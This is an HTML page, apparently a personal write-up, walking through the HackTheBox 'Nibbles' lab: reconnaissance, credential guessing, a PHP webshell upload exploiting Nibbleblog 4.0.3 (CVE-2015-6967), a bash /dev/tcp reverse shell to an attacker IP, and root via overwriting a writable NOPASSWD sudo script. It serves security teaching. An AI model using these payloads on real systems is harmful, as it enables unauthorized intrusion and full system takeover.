@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Nibbles — HackTheBox walkthrough</title>
+<meta name="description" content="Walkthrough for the Nibbles machine on HackTheBox: Nibbleblog authenticated file-upload RCE and a writable sudo script for the root shell." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/nibbles.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> HackTheBox</div>
+    <h1><em>Nibbles</em></h1>
+    <div class="wt-meta">
+      <span class="badge medium">Medium</span>
+      <span class="badge tag">linux</span>
+      <span class="badge tag">nibbleblog</span>
+      <span class="badge tag">file-upload</span>
+      <span class="badge tag">sudo</span>
+    </div>
+    <p class="wt-summary">
+      A clean two-stage Linux box. A forgotten <code>Nibbleblog</code> CMS is hiding inside
+      an HTML comment on the landing page; its 4.0.3 release carried an authenticated
+      arbitrary file-upload vulnerability (CVE-2015-6967) that lets us drop a PHP shell as
+      the web user. From there, a <code>sudo NOPASSWD</code> entry pointing at a
+      world-writable script in the user's home folder makes the privilege escalation
+      almost comedic.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#web">Finding Nibbleblog</a></li>
+      <li><a href="#creds">Getting admin credentials</a></li>
+      <li><a href="#rce">File-upload RCE</a></li>
+      <li><a href="#shell">Stable foothold as nibbler</a></li>
+      <li><a href="#privesc">Privilege escalation — writable sudo script</a></li>
+      <li><a href="#takeaways">Takeaways</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <pre><code>nmap -sC -sV -p- -T4 10.10.10.75 -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).</code></pre>
+
+  <p>Only two ports. SSH is version-current enough to not bother, so the whole box will
+  come through the web service.</p>
+
+  <h2 id="web"><span class="num">02</span> Finding Nibbleblog</h2>
+
+  <p>The landing page is effectively empty — just <em>"Hello world!"</em>. The trick is to
+  look at the source:</p>
+
+  <pre><code>curl -s http://10.10.10.75/ | head</code></pre>
+
+  <pre class="output"><code>&lt;b&gt;Hello world!&lt;/b&gt;
+
+&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code></pre>
+
+  <p>That comment is the whole clue. Browse to <code>/nibbleblog/</code> and we find a fully
+  rendered CMS. Fuzz its directory tree to identify the admin panel:</p>
+
+  <pre><code>gobuster dir -u http://10.10.10.75/nibbleblog/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt -t 40</code></pre>
+
+  <pre class="output"><code>/admin                (Status: 301)
+/admin.php            (Status: 200)
+/content              (Status: 301)
+/themes               (Status: 301)
+/plugins              (Status: 301)
+/README               (Status: 200)</code></pre>
+
+  <p>Two files are worth reading right away:</p>
+
+  <pre><code>curl http://10.10.10.75/nibbleblog/README
+curl http://10.10.10.75/nibbleblog/content/private/users.xml</code></pre>
+
+  <p><code>README</code> confirms the version — <strong>Nibbleblog 4.0.3</strong>. The
+  <code>users.xml</code> path reveals the admin username is <code>admin</code>. CVE-2015-6967
+  applies directly to this version: an authenticated admin can upload arbitrary files
+  through the "My Image" plugin.</p>
+
+  <h2 id="creds"><span class="num">03</span> Getting admin credentials</h2>
+
+  <p>We need a working login before the file-upload vuln is reachable. There's no
+  registration form, so the only option is brute force — but carefully, because
+  Nibbleblog locks the admin account for five minutes after five bad attempts.</p>
+
+  <p>Try the obvious first:</p>
+
+  <pre><code>curl -i -s -X POST http://10.10.10.75/nibbleblog/admin.php \
+  -d "username=admin&amp;password=nibbles" -c cookies.txt</code></pre>
+
+  <p>Machine name as password — it works. <code>admin:nibbles</code> is the intended
+  credential. If it didn't, targeted guessing (<code>admin</code>, <code>nibbleblog</code>,
+  <code>nibbler</code>) would have hit within a couple of tries.</p>
+
+  <div class="callout warn">
+    <strong>Careful:</strong> do <em>not</em> run hydra with rockyou.txt here. The
+    account-lockout mechanism will trigger within seconds, and you'll waste the next
+    five minutes staring at "blacklist" errors. Short, targeted lists only.
+  </div>
+
+  <h2 id="rce"><span class="num">04</span> File-upload RCE</h2>
+
+  <p>Log in at <code>/nibbleblog/admin.php</code> with <code>admin:nibbles</code>, then
+  navigate to <em>Plugins → My image → Configure</em>. The upload form accepts PHP because
+  Nibbleblog 4.0.3 doesn't validate the extension server-side.</p>
+
+  <p>Prepare a minimal webshell (pentestmonkey's PHP reverse shell is the classic, but a
+  one-liner is plenty):</p>
+
+  <pre class="shell"><code>cat &gt; shell.php &lt;&lt;'EOF'
+&lt;?php system($_GET['c']); ?&gt;
+EOF</code></pre>
+
+  <p>Upload <code>shell.php</code> through the plugin form, then visit the plugin's
+  image directory to trigger it:</p>
+
+  <pre><code>curl "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?c=id"</code></pre>
+
+  <div class="callout">
+    <strong>Note:</strong> the file on disk is renamed to <code>image.php</code> by the
+    plugin regardless of the uploaded filename. Don't waste time browsing for
+    <code>shell.php</code>; it's always at the path above.
+  </div>
+
+  <p>For a real shell, catch a reverse connection:</p>
+
+  <pre class="shell"><code># attacker
+nc -lvnp 4444
+
+# trigger
+curl "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?c=bash+-c+'bash+-i+%3E%26+/dev/tcp/10.10.X.X/4444+0%3E%261'"</code></pre>
+
+  <p>Shell lands as the <code>nibbler</code> user.</p>
+
+  <h2 id="shell"><span class="num">05</span> Stable foothold as nibbler</h2>
+
+  <p>First: stabilize the shell.</p>
+
+  <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z
+stty raw -echo; fg
+# Enter, Enter</code></pre>
+
+  <p>Grab the user flag:</p>
+
+  <pre><code>cat /home/nibbler/user.txt</code></pre>
+
+  <p>There's also a <code>personal.zip</code> in the home folder. Unzip it in place:</p>
+
+  <pre><code>cd /home/nibbler
+unzip personal.zip</code></pre>
+
+  <p>Inside is a <code>personal/stuff/</code> directory with a script called
+  <code>monitor.sh</code>. That filename — plus the fact someone bothered to zip it up
+  — is the privesc hint.</p>
+
+  <h2 id="privesc"><span class="num">06</span> Privilege escalation — writable sudo script</h2>
+
+  <p>Check what <code>nibbler</code> can run as root:</p>
+
+  <pre><code>sudo -l</code></pre>
+
+  <pre class="output"><code>User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre>
+
+  <p>The <code>NOPASSWD</code> on a script living in the user's own home folder is the whole
+  vulnerability. We don't even need to exploit the script's logic — we simply overwrite it:</p>
+
+  <pre><code>ls -la /home/nibbler/personal/stuff/monitor.sh</code></pre>
+
+  <pre class="output"><code>-rwxrwxrwx 1 nibbler nibbler 4015 ...  monitor.sh</code></pre>
+
+  <p>World-writable. Replace the file with a one-line payload:</p>
+
+  <pre class="shell"><code>echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
+echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
+chmod +x /home/nibbler/personal/stuff/monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh</code></pre>
+
+  <pre class="output"><code>root@Nibbles:~# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+  <pre><code>cat /root/root.txt</code></pre>
+
+  <h2 id="takeaways"><span class="num">07</span> Takeaways</h2>
+
+  <ul>
+    <li><strong>Always view the source of empty-looking pages.</strong> The <em>"Hello
+    world!"</em> page hides the entire foothold in a single HTML comment. This pattern
+    repeats constantly on HTB and in the real world.</li>
+    <li><strong>Read <code>README</code>, <code>CHANGELOG</code>, <code>version.txt</code>.</strong>
+    Free version fingerprinting; no guessing required.</li>
+    <li><strong><code>sudo -l</code> is always step one post-foothold.</strong> A surprising
+    number of boxes — and real environments — have <code>NOPASSWD</code> entries pointing
+    at user-writable scripts. It's the single cheapest check in the privesc toolbox.</li>
+    <li><strong>Lockout-aware brute force.</strong> Lists of 5–20 targeted guesses beat
+    rockyou.txt against any application with rate-limiting. Context (the box name, the
+    app name, the admin's habits) usually gets you in.</li>
+  </ul>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>HackTheBox · Nibbles</div>
+  </footer>
+
+</div>
+</body>
+</html>
